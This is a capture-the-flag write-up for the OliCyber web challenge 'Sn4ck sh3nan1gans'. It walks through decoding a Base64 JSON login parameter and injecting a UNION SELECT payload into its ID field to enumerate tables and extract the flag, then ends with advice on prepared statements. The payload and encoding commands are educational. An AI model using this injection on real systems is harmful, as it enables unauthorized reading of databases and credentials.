# Sn4ck sh3nan1gans

**Competition:** OliCyber<br>
**Category:** Web<br>
**URL:** http://sn4ck-sh3nan1gans.challs.olicyber.it

---

## Description

> I found this login page, but there doesn't seem to be anything interesting. You take a look — I'm going for a snack.

A login page that accepts a `login` parameter containing a Base64-encoded value. The goal is to manipulate this parameter to gain access with elevated privileges.

---

## Solution

### Step 1 — Analyzing the Login Parameter

The login page receives a `login` parameter with the value:

```
eyJJRCI6MjQ4fQ==
```

This looks like **Base64-encoded** data. Let's decode it:

```bash
echo "eyJJRCI6MjQ4fQ==" | base64 -d
```

**Output:**
```json
{"ID":248}
```

Interesting! The parameter contains JSON with an `ID` field set to `248`.

---

### Step 2 — Identifying the Vulnerability

The login page accepts the parameter, decodes it, and then uses it in a **SQL query without sanitization**!

The decoded value:
```json
{"ID":248}
```

Is likely used in a query like:

```sql
SELECT * FROM users WHERE ID = 248
```

But the `ID` field accepts **SQL directly**! We can inject a full SQL query.

---

### Step 3 — SQL Injection

The parameter value is treated as SQL, so we can use `UNION SELECT` to extract data from the database:

```bash
# Build a UNION SELECT payload to enumerate table names
payload = '252352 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0'
```

Encode to Base64:

```bash
echo '{"ID":"252352 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0"}' | base64
```

Visit:
```
http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php?login=BASE64_ENCODED
```

---

### Step 4 — Database Enumeration

**The Python exploit script is available in this folder → [`sn4cksh3nan1gans.py`](sn4cksh3nan1gans.py)**

---

### Step 5 — Running the Script

```bash
# Make the script executable
chmod +x sn4cksh3nan1gans.py

# Run the script
python3 sn4cksh3nan1gans.py
```

The script will:

1. Enumerate all database tables
2. Ask you to choose which table to inspect
3. Enumerate all columns in that table
4. Ask you to choose which column to read
5. Extract all data from that column
6. If "flag" is found in the data, print it

**Expected output:**

```
[*] Enumerating tables...
  [0] information_schema
  [1] flags
  [2] users

[?] Select table index: 1

[*] Enumerating columns from 'flags'...
  [0] id
  [1] flag_content

[?] Select column index: 1

[*] Extracting data from 'flags'.'flag_content'...

[+] Result: flag{...}
[+] Flag found: flag{...}
```

---

### Step 6 — Result

The flag is automatically extracted by the script and displayed as:

```
flag{...}
```

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | SQL Injection (SQLi) via the login parameter |
| **Root Cause** | The `login` parameter value is used directly in a SQL query without sanitization |
| **Vector** | Manipulating the JSON inside the Base64-encoded `login` parameter with SQL payloads |
| **Impact** | Full database read access — tables, columns, flag, credentials, sensitive data |

---

## Conclusions

This challenge shows how **SQL Injection** remains one of the most critical and widespread web vulnerabilities. Security is not achieved by:

1. Encoding data (Base64)
2. Filtering individual characters
3. Trusting user input

Security is only achieved with:

1. **Prepared Statements**: the most effective defense
2. **Server-side validation**
3. **Least privilege on the database**
4. **Proper error handling**